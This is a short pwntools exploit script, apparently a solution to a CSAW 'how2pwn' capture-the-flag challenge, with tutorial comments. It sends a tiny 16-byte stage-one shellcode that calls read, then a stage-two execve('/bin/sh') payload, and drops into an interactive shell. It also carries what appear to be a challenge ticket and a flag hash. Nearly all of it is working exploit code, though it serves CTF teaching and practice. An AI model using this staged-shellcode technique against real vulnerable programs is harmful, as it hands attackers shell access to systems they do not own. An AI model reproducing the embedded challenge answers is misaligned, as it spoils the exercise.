from pwn import *

p = process("./chal2")
p = remote("how2pwn.chal.csaw.io", 60002)
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# For this challenge, your task is to get a shell with shorter shellcode: 0x10 bytes

# Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check these registers!

# Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") cuz len("/bin/sh")==0x8. \
# Why don't we call read rather than execve \
# so we could read longer shellcode and execute "/bin/sh" 

context.arch = 'amd64'
shellcode = f'''
mov edx, edx
syscall
'''
# gdb.attach(p)
shellcode = asm(shellcode)
print(len(shellcode))

p.send(b"764fce03d863b5155db4af260374acc1")
p.sendafter(": \n",shellcode.ljust(0x10,b'\0'))

shellcode = f'''
mov rax, 59
lea rdi, [rsi + 23]
xor rsi, rsi
xor rdx, rdx
syscall 
'''
shellcode = asm(shellcode)

pause()
p.sendline(b"A"*4 + shellcode + b"/bin/sh\0")

# If you sent proper shellcode which allows us to read longer shellcode, 
# you can try the following code. It's an easier way to generate shellcode
# p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))

p.interactive()
# 8e7bd9e37e38a85551d969e29b77e1ce
